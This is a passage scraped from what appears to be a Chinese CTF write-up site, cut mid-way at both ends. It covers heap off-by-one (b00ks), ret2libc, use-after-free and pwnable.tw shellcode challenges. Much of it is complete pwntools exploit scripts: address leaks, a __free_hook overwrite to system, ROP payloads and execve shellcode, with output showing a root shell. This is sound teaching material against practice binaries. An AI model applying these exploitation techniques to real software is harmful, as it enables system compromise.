[rsp+14h] [rbp-Ch]  _BYTE *buf; // [rsp+18h] [rbp-8h]  if ( len_1 \u0026lt;= 0 ) return 0LL; buf = ptr; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == \u0026#39;\\n\u0026#39; ) break; ++buf; if ( i == len_1 ) break; } *buf = 0; return 0LL; } 漏洞发现 #  我们仔细研究 read_str() 这个函数之后会发现，如果在达到输入的长度时，for 循环结束时应该是以下状态：\n +--------+ 0 | | ---------- ... | | ---------- len-1| top |\u0026lt;----i ---------- len |overflow|\u0026lt;----buff\r+--------+ 可见最后一个 0 字节是写向了缓冲区外部，是溢出了。这个函数是存在 off-by-one 漏洞的。\nleak_heap #  首先我们可以利用 author_name 在 .bss 区的溢出漏洞，打印 GLOBAL_LIBRARY 第一项的内容，而这一项是一个指向 heap 段的地址，通过这个方法我们可以泄露堆地址：\n# todo: leak heap addr self.set_author_name(\u0026#34;A\u0026#34; * 32) self.create(0x18, \u0026#34;B\u0026#34; * 0x18, 0x100, \u0026#34;C\u0026#34; * 0x100) # 1 self.detail() author = [ld[\u0026#34;Author\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;1\u0026#34;] assert len(author) == 1 library0 = u64(author[0][32:] + \u0026#34;\\x00\\x00\u0026#34;) print \u0026#34;leak library0 address: %s\u0026#34; % hex(library0) 泄露之后发现这个泄露的堆地址是 0x55C106CBC2B0，然后我们动态调式查看堆地址的内容可以发现：\n000055C106CBC260 00 00 00 00 00 00 00 00 21 00 00 00 00 00 00 00 ........!.......\r000055C106CBC270 4C 65 61 6B 48 65 61 70 00 00 00 00 00 00 00 00 LeakHeap........\r000055C106CBC280 00 00 00 00 00 00 00 00 21 00 00 00 00 00 00 00 ........!.......\r000055C106CBC290 4C 65 61 6B 44 65 73 63 00 00 00 00 00 00 00 00 LeakDesc........\r000055C106CBC2A0 00 00 00 00 00 00 00 00 31 00 00 00 00 00 00 00 ........1.......\r000055C106CBC2B0 01 00 00 00 00 00 00 00 70 C2 CB 06 C1 55 00 00 ........p.......\r000055C106CBC2C0 90 C2 CB 06 C1 55 00 00 18 00 00 00 00 00 00 00 ................\r000055C106CBC2D0 00 00 00 00 00 00 00 00 31 FD 01 00 00 00 00 00 ........1.......\r容易看出，上面截取的地址是三个连续的堆块。book name、book description 与 book 三个内存块。\nget_addr_write #  下面我们尝试获取任意地址写。同样根据上面的思路：\n 我们通过 .bss 段的溢出漏洞，可以覆盖 LIBRARY[0] 的最低字节，从而更改它指向的地址。 为了控制新的 LIBRARY[0]，可以通过将 description 的大小控制大于 0x100，这样 LIBRARY[0] 的地址就一定会落在它的 Description 上； 我们将新的 LIBRARY[0] 的 Decription 指向 LIBRARY[1]，于是我们就可以通过 LIBRARY[0] 指定目标地址，通过 LIBRARY[1] 修改地址的内容；  画图说明逻辑更加直观。比如，原本有一个正常的两个分配的书块：\n Heap Segment +--------------------+ 0x18 | book1 name buffer | ---------------------- 0x100 | book1 desc buffer | +-----------+ ---------------------- | library[0]|-----------\u0026gt;| book1 seqnumber | ------------- 0x20 | book1 name ptr | | library[1]|-+ | book1 desc ptr | ------------- | | book1 desc size | | ...... | | +--------------------+ +-----------+ | +--------------------+ | 0x20 | book2 name buffer | | ---------------------- | 0x20 | book2 desc buffer | | ---------------------- +---------\u0026gt;| book2 seqnumber | 0x20 | book2 name ptr | | book2 desc ptr | | book2 desc size | +--------------------+ 经过我们控制 LIBRARY[0] 的地址的之后可以形成如下的形式：\n Heap Segment +--------------------+ 0x18 | book1 name buffer | ---------------------- 0x100 | book1 desc buffer | +-----------+ | | | library[0]|------------\u0026gt;| control seqnumber | 1 ------------- | control name ptr | | library[1]|--+ | control desc ptr |---------+\r------------- | | control desc size | 0x100 |\r| ...... | | ---------------------- |\r+-----------+ | | book1 seqnumber | 1 |\r| 0x20 | book1 name ptr | |\r| | book1 desc ptr | |\r| | book1 desc size | 0x100 |\r| +--------------------+ |\r| +--------------------+ |\r| 0x20 | book2 name buffer | |\r| ---------------------- |\r| 0x20 | book2 desc buffer | |\r| ---------------------- |\r+--------\u0026gt; | book2 seqnumber | 2 |\r0x20 | book2 name ptr | |\r| book2 desc ptr |\u0026lt;--------+\r| book2 desc size | 0x20 +--------------------+ 于是我们可以通过 LIBRARY[0] 控制 LIBRARY[1] 的指针，从而修改/读取任意地址。\n泄露的脚本如下：\n# todo: get arbitrary address write\u0026amp;read self.create(0x20, \u0026#34;D\u0026#34; * 0x20, 0x20, \u0026#34;E\u0026#34; * 0x20) # 2 offset = library0 \u0026amp; 0xff assert offset \u0026gt;= 0x20 payload = \u0026#34;C\u0026#34;*(0x100+0x10 - offset) + p64(0x1) \\ + p64(library0 + 0x20 + 0x10) \\ + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \\ + p64(0x100) self.edit(1, payload) self.set_author_name(\u0026#34;A\u0026#34; * 32) print \u0026#34;get arbitrary address write\u0026amp;read\u0026#34; 可以通过下面两个函数进行任意读写：\ndef write_to(self, addr, content): self.edit(1, p64(addr) + p64(len(content) + 1)) self.edit(2, content) def read_from(self, addr): self.edit(1, p64(addr)) self.detail() desc = [ld[\u0026#34;Description\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;2\u0026#34;] assert len(desc) == 1 return u64((desc[0] + \u0026#34;\\x00\\x00\u0026#34;)[:8]) leak_libc #  除此之外我们还需要泄露 libc地址/栈地址，之后通过写 got 表劫持流程或者写 __malloc_hook 劫持流程等。\n因为 off-by-one 漏洞的存在，我们可以利用 unlink 方法，因为此时堆区就被放入了unsorted bins 的双向链表中，这样就可以将 main_arena.bins 的地址写入堆区中。\n但是我们本地调试环境是 libc 2.28，在 2.26 之后 glibc 引入了 tcache 机制，我们需要先释放 7 个 chunk 填充 tcache 垃圾箱，从第八个开始才会进入 unsorted bins。代码如下：\n# todo: leak libc address via unsorted bin address for i in range(4): self.create(0x100, \u0026#34;F\u0026#34; * 0x100, 0x100, \u0026#34;G\u0026#34; * 0x100) # 3,4,5,6 for i in range(4): self.delete(i + 3) # 3,4,5,6 libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0 print \u0026#34;leak libc base address: %s\u0026#34; % hex(libcbase) write __free_hook #  在 libc 的 free 函数执行之前，会检查一个地址中是否存在函数。如果存在则传入目标地址并且执行它，这个地址叫做 __free_hook，我们可以将这个地址指向 system 函数，触发释放就可以得到 shell。\n为了执行 system(\u0026quot;/bin/sh\u0026quot;)，我们需要执行以下的两步操作：\n 将 /bin/sh 字符串写入需要释放的内存区域中； 将 __free_hook 对应的地址指向 system 函数。  # todo: # 1. write \u0026#34;/bin/sh\u0026#34; to library[2] name # 2. replace `__free_hook` as `system` bin_sh_addr = libcbase + next(self.libc.search(\u0026#34;/bin/sh\u0026#34;)) free_hook_addr = libcbase + self.libc.symbols[\u0026#34;__free_hook\u0026#34;] system_addr = libcbase + self.libc.symbols[\u0026#34;system\u0026#34;] print \u0026#34;\u0026#39;/bin/sh\u0026#39; address: %x\u0026#34; % bin_sh_addr print \u0026#34;_free_hook address: %x\u0026#34; % free_hook_addr print \u0026#34;system address: %x\u0026#34; % system_addr self.create(0x20, \u0026#34;/bin/sh\u0026#34;, 0x20, \u0026#34;/bin/sh\u0026#34;) # 7 self.write_to(free_hook_addr, p64(system_addr)) get_shell #  最后就可以触发释放函数拿到主机 shell：\n# todo: get shell self.p.sendline(\u0026#34;2\u0026#34;) self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, \u0026#34;7\u0026#34;) self.p.interactive() 脚本 #  完整的 exp.py 如下：\n#!/usr/bin/env python2 # coding=utf-8 from pwn import * class Challenge: def __init__(self, local=True): self.local = local self.p = process([\u0026#34;./b00ks\u0026#34;]) self.libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.28.so\u0026#34;) self.library_detail = [] def gdb(self, script): assert self.local context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(proc.pidof(self.p)[0], gdbscript=script) def create(self, book_name_size, book_name, desc_size, description): self.p.sendline(\u0026#34;1\u0026#34;) self.p.sendlineafter(\u0026#34;Enter book name size: \u0026#34;, str(book_name_size)) self.p.sendlineafter(\u0026#34;Enter book name (Max 32 chars): \u0026#34;, book_name) self.p.sendlineafter(\u0026#34;Enter book description size: \u0026#34;, str(desc_size)) self.p.sendlineafter(\u0026#34;Enter book description: \u0026#34;, description) self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) def delete(self, book_id): self.p.sendline(\u0026#34;2\u0026#34;) self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, str(book_id)) self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) def edit(self, book_id, new_desc): self.p.sendline(\u0026#34;3\u0026#34;) self.p.sendlineafter(\u0026#34;Enter the book id you want to edit: \u0026#34;, str(book_id)) self.p.sendlineafter(\u0026#34;Enter new book description: \u0026#34;, new_desc) self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) def detail(self): self.p.sendline(\u0026#34;4\u0026#34;) detail = self.p.recvuntil(\u0026#34;\\n\\n\u0026#34;) self.library_detail = [ { (\u0026#34;ID\u0026#34; if len(item) == 1 else item[0]): (item[0] if len(item) == 1 else item[1]) for item in [i.split(\u0026#34;: \u0026#34;) for i in dp.strip(\u0026#34;\\n\u0026#34;).split(\u0026#34;\\n\u0026#34;)] } for dp in detail.split(\u0026#34;\\nID: \u0026#34;) ] self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) def set_author_name(self, author_name, init=False): if not init: self.p.sendline(\u0026#34;5\u0026#34;) self.p.sendlineafter(\u0026#34;Enter author name: \u0026#34;, author_name) self.p.recvuntil(\u0026#34;\u0026gt; \u0026#34;) def write_to(self, addr, content): self.edit(1, p64(addr) + p64(len(content) + 1)) self.edit(2, content) def read_from(self, addr): self.edit(1, p64(addr)) self.detail() desc = [ld[\u0026#34;Description\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;2\u0026#34;] assert len(desc) == 1 return u64((desc[0] + \u0026#34;\\x00\\x00\u0026#34;)[:8]) def pwn(self): self.set_author_name(\u0026#34;shesl-meow\u0026#34;, init=True) # todo: leak heap addr self.set_author_name(\u0026#34;A\u0026#34; * 32) self.create(0x18, \u0026#34;B\u0026#34; * 0x18, 0x100, \u0026#34;C\u0026#34; * 0x100) # 1 self.detail() author = [ld[\u0026#34;Author\u0026#34;] for ld in self.library_detail if ld[\u0026#34;ID\u0026#34;] == \u0026#34;1\u0026#34;] assert len(author) == 1 library0 = u64(author[0][32:] + \u0026#34;\\x00\\x00\u0026#34;) print \u0026#34;leak library0 address: %s\u0026#34; % hex(library0) # todo: get arbitrary address write\u0026amp;read self.create(0x20, \u0026#34;D\u0026#34; * 0x20, 0x20, \u0026#34;E\u0026#34; * 0x20) # 2 offset = library0 \u0026amp; 0xff assert offset \u0026gt;= 0x20 payload = \u0026#34;C\u0026#34;*(0x100+0x10 - offset) + p64(0x1) \\ + p64(library0 + 0x20 + 0x10) \\ + p64(library0 + 0x20 + 0x30 + 0x30 + 0x10 + 0x10) \\ + p64(0x100) self.edit(1, payload) self.set_author_name(\u0026#34;A\u0026#34; * 32) print \u0026#34;get arbitrary address write\u0026amp;read\u0026#34; # todo: leak libc address via unsorted bin address for i in range(4): self.create(0x100, \u0026#34;F\u0026#34; * 0x100, 0x100, \u0026#34;G\u0026#34; * 0x100) # 3,4,5,6 for i in range(4): self.delete(i + 3) # 3,4,5,6 libcbase = self.read_from(library0 + 0x8c0) - 0x1bbca0 print \u0026#34;libc base address: %x\u0026#34; % libcbase # todo: # 1. write \u0026#34;/bin/sh\u0026#34; to library[2] name # 2. replace `__free_hook` as `system` bin_sh_addr = libcbase + next(self.libc.search(\u0026#34;/bin/sh\u0026#34;)) free_hook_addr = libcbase + self.libc.symbols[\u0026#34;__free_hook\u0026#34;] system_addr = libcbase + self.libc.symbols[\u0026#34;system\u0026#34;] print \u0026#34;\u0026#39;/bin/sh\u0026#39; address: %x\u0026#34; % bin_sh_addr print \u0026#34;_free_hook address: %x\u0026#34; % free_hook_addr print \u0026#34;system address: %x\u0026#34; % system_addr self.create(0x20, \u0026#34;/bin/sh\u0026#34;, 0x20, \u0026#34;/bin/sh\u0026#34;) # 7 self.write_to(free_hook_addr, p64(system_addr)) # todo: get shell self.p.sendline(\u0026#34;2\u0026#34;) self.p.sendlineafter(\u0026#34;Enter the book id you want to delete: \u0026#34;, \u0026#34;7\u0026#34;) self.p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: c = Challenge() c.pwn() "},{"id":19,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/ctf-wiki/ret2libc3/","title":"Ret2libc3","section":"ctf-wiki","content":"ret2libc #  保护等级 #  首先检查保护等级：\n$ checksec ret2libc3 [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/ret2libc3/ret2libc3\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看到这是一个开启了部分只读和栈溢出保护的程序。\n程序逻辑 #  在 Ida Pro 中打开即可看到 main 函数的伪代码：\nint __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h]  setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;); printf(\u0026#34;Can you find it !?\u0026#34;); gets(\u0026amp;s); return 0; } 可见这是一个相当明显的栈溢出。0x64 个字节就能覆盖到原 EBP、0x68 就能覆盖到返回地址。\n利用 #  查找字符串和 system 函数之后发现都没找到。那么我们如何得到 system 函数的地址呢？\n  system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。\n  所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。\n  那么如何得到 libc 中的某个函数的地址呢？\n 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。 当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，通常选取的函数是 __libc_start_main，这是因为它是程序最初被执行的地方。  PostScript: 关于 PLT 表与 GOT 表的关系可以参考 LIEF\nleak_libc_main #  我们将控制 main 函数溢出后，其栈帧形成下面的形式：\n +----------------+ | | 0x64 | local variable |-----\u0026gt; 'A'*0x64 | | +----------------+ 0x4 | previous $ebp |-----\u0026gt; 'A'* 0x4 +----------------+ 0x4 | return address |-----\u0026gt; \u0026quot;puts\u0026quot; address +----------------+ ------\u0026gt; \u0026quot;main\u0026quot; address ------\u0026gt; .got.plt:\u0026quot;__start_libc_main\u0026quot;\r实际上执行的是这样一个函数 puts(\u0026quot;__start_libc_main\u0026quot;)。\nget_shell #  因为上面的的栈帧控制，我们可以再执行一次 main 函数，经过之前的泄露我们可以得到 libc 的加载基地址，因此可以得到 system 的地址，从而可以执行系统调用拿到 shell：\n +----------------+ | | 0x64 | local variable ------\u0026gt; 'A'*0x64 | | +----------------+ 0x4 | previous $ebp ------\u0026gt; 'A'* 0x4 +----------------+ 0x4 | return address ------\u0026gt; \u0026quot;system\u0026quot; address +----------------+ ------\u0026gt; 'A'* 0x4 ------\u0026gt; \u0026quot;/bin/sh\u0026quot; address\r实际上执行的是这样一个函数 system(\u0026quot;/bin/sh\u0026quot;)。\n脚本 #  #!/usr/bin/env python2 # coding=utf-8 from pwn import * class Challenge: libc_main_addr = 0x1AA50 libc_system_addr = 0x3E9E0 libc_binsh_addr = 0x17EAAA def __init__(self): self.p = process([\u0026#34;./ret2libc3\u0026#34;]) self.elf = ELF(\u0026#34;./ret2libc3\u0026#34;) def leak_libc_main(self): puts_addr = self.elf.plt[\u0026#34;puts\u0026#34;] libc_main_addr = self.elf.got[\u0026#34;__libc_start_main\u0026#34;] main_symbol = self.elf.symbols[\u0026#34;main\u0026#34;] # todo 我也不知道为什么是 0x70 的偏移，按反汇编结果应该是 0x68 才对。栈结构： # _puts 地址(第一次 main 返回地址)==\u0026gt;_puts 返回地址(第二次 main 地址)==\u0026gt;_puts 参数(got[\u0026#34;libc_main\u0026#34;]) payload = flat([\u0026#39;A\u0026#39; * (0x6c + 0x4), puts_addr, main_symbol, libc_main_addr]) self.p.recvuntil(\u0026#34;Can you find it !?\u0026#34;) self.p.sendline(payload) self.leak_main_addr = u32(self.p.recv()[:4]) print(\u0026#34;__libc_start_main: %s\u0026#34; % hex(self.libc_main_addr)) def get_libc_offset(self): self.libc_base = self.leak_main_addr - self.libc_main_addr print(\u0026#34;libc offset: %s\u0026#34; % hex(self.libc_base)) def get_shell(self): system_addr = self.libc_base + self.libc_system_addr bin_sh_addr = self.libc_base + self.libc_binsh_addr payload = flat([\u0026#34;A\u0026#34; * (0x64 + 0x4), system_addr, \u0026#34;A\u0026#34; * 0x4, bin_sh_addr]) self.p.sendline(payload) self.p.interactive() def pwn(self): self.leak_libc_main() self.get_libc_offset() self.get_shell() self.p.wait_for_close() if __name__ == \u0026#34;__main__\u0026#34;: c = Challenge() c.pwn() 执行结果：\n$ python exp.py [+] Starting local process \u0026#39;./ret2libc3\u0026#39;: pid 6456 [*] \u0026#39;/tmp/pycharm_project_477/ret2libc3\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) __libc_start_main: 0x1aa50 libc offset: 0xf7d55000 [*] Switching to interactive mode $ whoami root "},{"id":20,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/ctf-wiki/useafterfree/","title":"Useafterfree","section":"ctf-wiki","content":" 题目：Hitcon Training lab10\n Use After Free #  文件信息 #  检查文件安全性：\n$ checksec ./hacknote [*] \u0026#39;/mnt/d/program/ctf/ctf-wiki/useafterfree/hacknote\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 程序没有开启地址随机化，有栈保护和堆栈不可执行。\n程序逻辑 #  这个可执行文件中存在函数的调式信息，main 函数就是打印菜单，然后执行几个选项的常规套路。\nmenu #  int menu() { puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; HackNote \u0026#34;); puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; 1. Add note \u0026#34;); puts(\u0026#34; 2. Delete note \u0026#34;); puts(\u0026#34; 3. Print note \u0026#34;); puts(\u0026#34; 4. Exit \u0026#34;); puts(\u0026#34;----------------------\u0026#34;); return printf(\u0026#34;Your choice :\u0026#34;); } 可见输出四个数字对应的功能。\nadd_note #  简单的分配地址的功能。通过阅读源码实现逻辑，存储结构大致如下：\nstruct Note{ void (*func_ptr)(int);\t// 指向了 `print_note_content` 的函数地址  char *buffer;\t// 用户通过指定一个 `size` 读入的内容 }; Note notlist[5]; del_note #  删除笔记：\nunsigned int del_note() { int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u); printf(\u0026#34;Index :\u0026#34;); read(0, \u0026amp;buf, 4u); v1 = atoi(\u0026amp;buf); if ( v1 \u0026lt; 0 || v1 \u0026gt;= count ) { puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if ( notelist[v1] ) { free(*((void **)notelist[v1] + 1)); free(notelist[v1]); puts(\u0026#34;Success\u0026#34;); } return __readgsdword(0x14u) ^ v3; } 需要注意的是，这里的笔记内存被释放后，并没有清空指针。这有可能导致 UAF 漏洞或 Double Free 漏洞。\nprint_note #  因为没有清空指针会导致的 UAF 漏洞即在此处发生。\nunsigned int print_note() { int v1; // [esp+4h] [ebp-14h]  char buf; // [esp+8h] [ebp-10h]  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u); printf(\u0026#34;Index :\u0026#34;); read(0, \u0026amp;buf, 4u); v1 = atoi(\u0026amp;buf); if ( v1 \u0026lt; 0 || v1 \u0026gt;= count ) { puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if ( notelist[v1] ) (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]); return __readgsdword(0x14u) ^ v3; } 它的程序逻辑是读入一个 index，调用对应位置第一个内容存储的 print_note_content 函数，将内容打印出来。\nmagic #  比较有意思的是从函数表中还可以看到这样一个没有被调用的函数：\nint magic() { return system(\u0026#34;cat flag\u0026#34;); } 据此我们就大概可以猜测到，破解的思路应该是执行 magic 函数即可。\n漏洞利用 #  根据之前的阅读源码很显然这是一个 UAF 漏洞。我们\n"},{"id":21,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/pwnable/1.start/","title":"1.Start","section":"pwnable","content":" 参考资料：\n 安全客，前六题的题解：https://www.anquanke.com/post/id/150359 Linux Syscall Reference：http://syscalls.kernelgrok.com/ Assembly Reference: https://www.felixcloutier.com/x86/   START #  首先检查安全保护等级：\n$ checksec ./start [*] \u0026#39;/mnt/d/program/ctf/pwnable/start/start\u0026#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 查看汇编代码：\n$ objdump -d ./start ./start: file format elf32-i386 Disassembly of section .text: 08048060 \u0026lt;_start\u0026gt;: 8048060: 54 push %esp 8048061: 68 9d 80 04 08 push $0x804809d 8048066: 31 c0 xor %eax,%eax 8048068: 31 db xor %ebx,%ebx 804806a: 31 c9 xor %ecx,%ecx 804806c: 31 d2 xor %edx,%edx 804806e: 68 43 54 46 3a push $0x3a465443 8048073: 68 74 68 65 20 push $0x20656874 8048078: 68 61 72 74 20 push $0x20747261 804807d: 68 73 20 73 74 push $0x74732073 8048082: 68 4c 65 74 27 push $0x2774654c 8048087: 89 e1 mov %esp,%ecx 8048089: b2 14 mov $0x14,%dl 804808b: b3 01 mov $0x1,%bl 804808d: b0 04 mov $0x4,%al 804808f: cd 80 int $0x80 8048091: 31 db xor %ebx,%ebx 8048093: b2 3c mov $0x3c,%dl 8048095: b0 03 mov $0x3,%al 8048097: cd 80 int $0x80 8048099: 83 c4 14 add $0x14,%esp 804809c: c3 ret 0804809d \u0026lt;_exit\u0026gt;: 804809d: 5c pop %esp 804809e: 31 c0 xor %eax,%eax 80480a0: 40 inc %eax 80480a1: cd 80 int $0x80 我们分析这个汇编代码的结构：\n  观察这个函数的开始段，它并没有诸如押入 ebp 等栈操作。一直到 0x804806c 这个地址，函数做了一些初始化的事情，并且把四个寄存器置 0；\n  0x804806e - 0x8048082 这段地址向栈中存入了字符串（小端存储、栈从高到低增长）：\nprint(b\u0026#39;\\x4c\\x65\\x74\\x27\\x73\\x20\\x73\\x74\\x61\\x72\\x74\\x20\\x74\\x68\\x65\\x20\\x43\\x54\\x46\\x3a\u0026#39;) # b\u0026#34;Let\u0026#39;s start the CTF:\u0026#34;   0x8048087 - 0x804808f 这段代码调用了 int 80h 中断，查询网址，知道 4 号中断是 sys_write()：\nsys_write(unsigned int fd = 1, const char __user *buf = $esp, int count = 0x14)   0x8048091 - 0x8048097 这段代码调用了 int 80h 的 3 号中断 sys_read()：\nsys_read(unsigned int fd = 0, const char __user *buf = $esp, int count = 0x3c)   然后程序在 0x8048099 将栈顶指针上移了 0x14 个字节。\n  然后程序执行 ret 指令（ret 指令只做一件事情，将程序的执行权交给栈顶 esp 指向的地址）。\n  exp.py 如下：\n#!/usr/bin/env python #coding=utf-8 from pwn import * class Challenge: def __init__(self, local=True): self.local = local if local: self.p = process([\u0026#39;./start\u0026#39;]) else: self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10000) def gdb(self): assert self.local context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(proc.pidof(self.p)[0]) def leak_esp(self): self.p.recvuntil(\u0026#39;:\u0026#39;) payload1 = \u0026#39;a\u0026#39;*0x14 + p32(0x8048087) self.p.send(payload1) self.esp = self.p.recv(4) print(\u0026#34;get esp:\u0026#34;, list(self.esp)) def inject_shellcode(self): shellcode = asm(\u0026#39;\u0026#39;.join([ \u0026#34;push %d\\n\u0026#34; % u32(\u0026#34;/sh\\0\u0026#34;), \u0026#34;push %d\\n\u0026#34; % u32(\u0026#34;/bin\u0026#34;), \u0026#34;mov ebx,esp\\n\u0026#34;, # EBX 指向栈顶 \u0026#34;xor edx,edx\\n\u0026#34;, # 置零 EDX \u0026#34;xor ecx,ecx\\n\u0026#34;, # 置零 ECX \u0026#34;mov eax,0xb\\n\u0026#34;, # 指明中断进程 sys_execute \u0026#34;int 0x80\u0026#34; ])) assert len(shellcode) \u0026lt; 0x3c - 0x14 - 0x4 payload2 = \u0026#39;a\u0026#39;*0x14 + p32(u32(self.esp) + 0x14) + shellcode self.p.send(payload2) def get_shell(self): self.p.interactive() def pwn(self): print(\u0026#34;----------begin-----------\u0026#34;) self.leak_esp() self.inject_shellcode() self.get_shell() self.p.wait_for_close() print(\u0026#34;-----------end------------\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: s = Challenge(False) s.pwn() "},{"id":22,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/ctf-writeup/pwnable/2.orw/","title":"2.Orw","section":"pwnable","content":" 参考资料：\n https://www.anquanke.com/post/id/150359   ORW #  首先检查安全保护等级：\n$ checksec orw [*] \u0026#39;/media/data/program/ctf/pwnable/orw/orw\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看到这个程序开启了以下保护机制：\n Canary 开启，部分 RELOAD，还有 RWX 读写执行段。  在 gdb 里面可以查看 main 函数的汇编代码：\n(gdb) info functions\rAll defined functions:\rNon-debugging symbols:\r0x08048330 _init\r0x08048370 read@plt\r0x08048380 printf@plt\r0x08048390 __stack_chk_fail@plt\r0x080483a0 __libc_start_main@plt\r0x080483b0 prctl@plt\r0x080483c0 __gmon_start__@plt\r0x080483d0 _start\r0x08048400 __x86.get_pc_thunk.bx\r0x08048410 deregister_tm_clones\r0x08048440 register_tm_clones\r0x08048480 __do_global_dtors_aux\r0x080484a0 frame_dummy\r0x080484cb orw_seccomp\r0x08048548 main\r0x080485a0 __libc_csu_init\r0x08048600 __libc_csu_fini\r0x08048604 _fini\r(gdb) disas main\rDump of assembler code for function main:\r0x08048548 \u0026lt;+0\u0026gt;: lea 0x4(%esp),%ecx\r0x0804854c \u0026lt;+4\u0026gt;: and $0xfffffff0,%esp\r0x0804854f \u0026lt;+7\u0026gt;: pushl -0x4(%ecx)\r0x08048552 \u0026lt;+10\u0026gt;: push %ebp\r0x08048553 \u0026lt;+11\u0026gt;: mov %esp,%ebp\r0x08048555 \u0026lt;+13\u0026gt;: push %ecx\r0x08048556 \u0026lt;+14\u0026gt;: sub $0x4,%esp\r0x08048559 \u0026lt;+17\u0026gt;: call 0x80484cb \u0026lt;orw_seccomp\u0026gt;\r0x0804855e \u0026lt;+22\u0026gt;: sub $0xc,%esp\r0x08048561 \u0026lt;+25\u0026gt;: push $0x80486a0\r0x08048566 \u0026lt;+30\u0026gt;: call 0x8048380 \u0026lt;printf@plt\u0026gt;\r0x0804856b \u0026lt;+35\u0026gt;: add $0x10,%esp\r0x0804856e \u0026lt;+38\u0026gt;: sub $0x4,%esp\r0x08048571 \u0026lt;+41\u0026gt;: push $0xc8\r0x08048576 \u0026lt;+46\u0026gt;: push $0x804a060\r0x0804857b \u0026lt;+51\u0026gt;: push $0x0\r0x0804857d \u0026lt;+53\u0026gt;: call 0x8048370 \u0026lt;read@plt\u0026gt;\r0x08048582 \u0026lt;+58\u0026gt;: add $0x10,%esp\r0x08048585 \u0026lt;+61\u0026gt;: mov $0x804a060,%eax\r0x0804858a \u0026lt;+66\u0026gt;: call *%eax\r0x0804858c \u0026lt;+68\u0026gt;: mov $0x0,%eax\r0x08048591 \u0026lt;+73\u0026gt;: mov -0x4(%ebp),%ecx\r0x08048594 \u0026lt;+76\u0026gt;: leave 0x08048595 \u0026lt;+77\u0026gt;: lea -0x4(%ecx),%esp\r0x08048598 \u0026lt;+80\u0026gt;: ret End of assembler dump.\r可见这是一个有着完整编译结构的文件，我们主要看 main 函数中的主要功能：\n  在栈顶是 %ecx = 0x4(%esp) 的情况下，在 *main+17 行调用了函数 orw_seccomp；\n  传入字符串 0x80486a0，调用 printf@plt 函数。可以在 gdb 中查看字符串的内容：\n(gdb) x /s 0x80486a0\r0x80486a0: \u0026quot;Give my your shellcode:\u0026quot;\r  在 *main+41 ~ *main+51 行，函数通过三个参数调用了 read@plt 函数：\nread(0x0, 0x804a060, 0xc8)   在 *main+61 ~ *main+66 行，函数直接将传入的字符串作为一个函数进行了调用。\n  因此程序的逻辑就是：传入一个 shellcode 后这个 shellcode 会被执行。我们尝试直接按照题目的提示进行编写（flag 在文件 /home/orw/flag 中，并且只允许使用 open,read,write 三个函数）：\n#!/usr/bin/env python #coding=utf-8 from pwn import * class Challenge: def __init__(self, local=True): self.local = local if local: self.p = process([\u0026#39;./orw\u0026#39;]) else: self.p = remote(\u0026#34;chall.pwnable.tw\u0026#34;, 10001) def gdb(self): assert self.local context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] gdb.attach(proc.pidof(self.p)[0]) def inject_shellcode(self): self.p.recvuntil(\u0026#34;:\u0026#34;) shellcode = asm(\u0026#34;\\n\u0026#34;.join([ 